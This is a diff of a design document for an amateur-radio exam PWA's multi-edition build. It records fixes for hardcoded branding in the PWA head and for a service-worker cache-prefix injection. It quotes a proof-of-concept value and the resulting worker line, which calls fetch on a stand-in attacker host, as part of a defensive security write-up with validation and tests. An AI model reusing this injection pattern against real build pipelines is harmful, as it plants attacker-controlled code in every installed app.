@@ -1,7 +1,8 @@
 # Edition-build design: build selection, isolation, and boundaries (Stage 8A2)
 
-Recorded: October 11, 2026. Status: design for the Stage 8B-class isolated
-build experiment; not yet adopted architecture. Companion to
+Recorded: October 11, 2026. Status: as-built Stage 8A2 experiment, committed
+(and deployed) as `3a7dfab` with documentation/test follow-ups. The architecture
+remains subject to the explicit adopt/revise/reject decision in the multi-edition plan. Companion to
 [MULTI_EDITION_PLAN.md](MULTI_EDITION_PLAN.md) (decision and acceptance
 criteria) and [INDIA_ASOC_REQUIREMENTS.md](INDIA_ASOC_REQUIREMENTS.md)
 (evidence; the synthetic fixture here models nothing Indian). Requirements
@@ -152,8 +153,8 @@ activation-cleanup isolation are acceptance criteria tested in Phase 4.
     requiring instead: pool keys match the profile set, question IDs are
     unique non-empty strings that start with their pool's
     `questionIdPrefix`, and group keys are non-empty ID prefixes.
-- The runtime-projection allowlist gains exactly one field:
-  `namespacePolicy`. Nothing else is projected; build-only data never embeds.
+- The runtime-projection allowlist gains two Stage 8A2 fields:
+  `namespacePolicy` and `elementTermLabel`. Nothing else is projected; build-only data never embeds.
 - Non-US editions use the `"generic"` registry policy; the US build never
   does. Unsupported boundaries (per-part scoring, selection pipelines,
   per-edition validators beyond these two seams) fail clearly at build or
@@ -235,10 +236,13 @@ build-selection-seam slice and are still documented, not silently widened:
    mechanism and copy generalization described above in "Shared vs.
    edition-specific files." Confirmed by inspecting the built synthetic
    artifact for every US-specific term (`FCC`, `NCVEC`, `ARRL`,
-   `Technician`/`General`/`Extra`, `US Ham Exam`, the repository URL):
-   nothing remains except three inert, unreachable JS fallback literals and
-   one internal (non-user-visible) DOM id, both described in the "Known
-   boundary" note above.
+   `Technician`/`General`/`Extra`, `US Ham Exam`, the repository URL): at
+   the time, nothing remained in the generated HTML documents except three
+   inert, unreachable JS fallback literals and one internal
+   (non-user-visible) DOM id, both described in the "Known boundary" note
+   above. A later independent audit found one more real leak this pass
+   missed -- `src/pwa/head.html`'s PWA metadata, outside the two generated
+   HTML documents' own templating -- closed in Stage 8C below.
 3. **Not fixed: `scripts/figure-references.js`'s figure-prefix policy is
    hardcoded to exactly one uppercase letter** (`FIGURE_PREFIX_RE =
    /^[A-Z]$/`), checked unconditionally for every pool regardless of
@@ -256,3 +260,112 @@ build-selection-seam slice and are still documented, not silently widened:
    fail clearly (or simply do not apply) for a non-US edition -- unchanged
    from the original design, still correctly out of scope for this
    experiment.
+
+## Stage 8C: PWA metadata isolation and cache-prefix validation
+
+Two bounded fixes closing gaps a later independent audit found in the
+Stage 8A2 work above. Both are scoped exactly to their own finding --
+neither widens into India content, a storage-schema change, a repository
+rename, a deployment change, or the adopt/revise/reject decision itself.
+
+### 1. PWA metadata isolation (`src/pwa/head.html`)
+
+`apple-mobile-web-app-title` and the `<meta name="description">` tag --
+read by the OS for "Add to Home Screen"/app-switcher naming, outside the
+generated documents' own `<title>`/`<h1>`/About-name templating the
+Stage 8A2 branding slots already covered -- were still the hardcoded
+literals `"US Ham Exam"` and `"Offline study app for the FCC Technician,
+General, and Extra amateur-radio exams"`, shipped verbatim in every
+edition's PWA build, including the synthetic one.
+
+Fixed with two new placeholders, `__EDITION_HEAD_TITLE__` /
+`__EDITION_HEAD_DESCRIPTION__`, resolved in `scripts/build.js` -- **no new
+profile field**: they reuse the SAME already-resolved `displayName` /
+`manifestDescription` values the PWA manifest and the `<h1>`/About-name
+slots already use, so an edition's PWA head and its manifest describe the
+app identically by construction, and the US profile's existing declared
+`manifestDescription` keeps `head.html`'s meta description byte-identical
+to before this field existed (confirmed: `dist/pwa/index.html` is
+byte-for-byte unchanged). Ordering care was required: these placeholders
+live INSIDE `head.html`'s own text, which itself is spliced into the shared
+`src/index.html` template via the pre-existing `__PWA_HEAD__` placeholder --
+`scripts/build.js#render()`'s single-occurrence `String.replace()` means
+`__PWA_HEAD__` must be keyed before `__EDITION_HEAD_TITLE__`/
+`__EDITION_HEAD_DESCRIPTION__` in the replacements object, or the inner
+placeholders would still read as literal text when the "no unresolved
+placeholders" check runs. Distinct placeholder names from
+`__EDITION_APP_NAME__` (already used once, in the document `<h1>`) for the
+same reason: the single-occurrence `replace()` would otherwise leave this
+file's own copy of the text unresolved.
+
+### 2. Service-worker cache-prefix validation (`namespacePolicy.cachePrefix`)
+
+`cachePrefix` is substituted into `src/pwa/sw.js` as JS SOURCE TEXT at build
+time (a service worker has no access to `window.HAM_EXAM_EDITION_CONFIG`,
+so the literal must be baked in) -- the one namespace field that bypasses
+`asInlineScript()`'s JSON-safe embedding every other projected value goes
+through. Before this fix, `scripts/edition-profile.js` only required
+`cachePrefix` to be a non-blank string, with no charset restriction --
+confirmed exploitable: a profile declaring
+`cachePrefix: 'x"; fetch("https://evil.example"); //'` built successfully
+and produced a shipped service worker containing
+`const CACHE_PREFIX = "x"; fetch("https://evil.example"); //";` --
+arbitrary JavaScript running in every installed PWA's service worker.
+
+Fixed with two layers: (1) `CACHE_PREFIX_RE`
+(`/^[a-z][a-z0-9]*(-[a-z0-9]+)*-$/` -- lowercase/hyphen, same discipline as
+`EDITION_KEY_RE`, with a REQUIRED trailing hyphen since the full cache name
+is `<cachePrefix><12-hex-char version hash>` with no separator) added to
+`validateNamespacePolicy()`, the one function both the profile gate and the
+runtime-projection gate already call -- rejects every string-literal-breaking
+shape (quotes, backslashes, newlines, spaces, underscores, leading digits,
+leading/double hyphens, a missing trailing hyphen) before any `dist/`
+mutation, at the SAME point the rest of the profile is validated
+(`assertEditionProfile()`, near the top of `main()`). (2) `scripts/build.js`
+re-derives `cachePrefix` immediately after that gate (still before the
+first `fs` mutation) and re-checks `CACHE_PREFIX_RE` directly, named at the
+one use site that actually needs the guarantee -- defense in depth against
+the earlier gate ever silently regressing. The substitution itself now also
+runs `cachePrefix` through `jsonStringContent()` (the same escaped-JSON-
+string-content helper the manifest slots use) instead of a bare value, so
+even a future relaxation of `CACHE_PREFIX_RE` could not reopen the
+injection this pattern closes.
+
+Both of today's real values (`"ham-exam-"`, `"synthetic-exam-"`) already
+match `CACHE_PREFIX_RE`; cache naming and activation-cleanup behavior for a
+valid prefix are unchanged (confirmed: `CACHE_NAME = CACHE_PREFIX +
+"<hash>"`, `key.startsWith(CACHE_PREFIX) && key !== CACHE_NAME`, and a
+custom valid prefix produces a syntactically-parseable worker with the
+expected literal).
+
+### Testing
+
+- `tests/unit/edition-profile.test.js`: cachePrefix rejects twelve malformed
+  shapes (quote/backslash/newline breakouts, space/underscore delimiters,
+  uppercase, missing/leading/doubled hyphen, leading digit, a
+  template-literal-shaped string) at both the profile level and the derived
+  runtime-projection level (the shared `validateNamespacePolicy()`); accepts
+  single- and multi-segment valid prefixes.
+- `tests/unit/build-gate.test.js`: a malformed cachePrefix (six of the
+  above attacks, driven through the real `--edition` CLI) fails the build
+  before any `dist/`/`dist-editions/` mutation, leaving an unrelated
+  pre-existing US `dist/` byte-for-byte untouched; a malformed US
+  `cachePrefix` fails the same way; a valid custom cachePrefix produces the
+  expected `CACHE_NAME`/activation-cleanup text and a worker that parses as
+  syntactically valid JavaScript; the PWA head metadata resolves to each
+  edition's own `displayName`/`manifestDescription` with no US branding
+  anywhere in the synthetic `<head>` (scoped to the `<head>`, not the whole
+  document, since shared engine code legitimately carries the inert
+  fallback literals from finding 2 above); the US PWA head is unchanged.
+- `tests/editions-isolation.spec.js`: the one addition needing a real
+  browser -- both editions' SERVED `<head>` (what an OS reading "Add to
+  Home Screen" metadata actually sees) carry their own
+  `apple-mobile-web-app-title`/description, with no US term anywhere in the
+  synthetic edition's rendered `<head>`.
+
+### Remaining limitation (unchanged, still out of scope)
+
+`scripts/figure-references.js`'s figure-prefix policy is still hardcoded to
+exactly one uppercase letter (finding 3 above) -- neither Stage 8C fix
+touches it; it remains the one concrete, reproduced gap in validator
+generality this experiment has not closed.
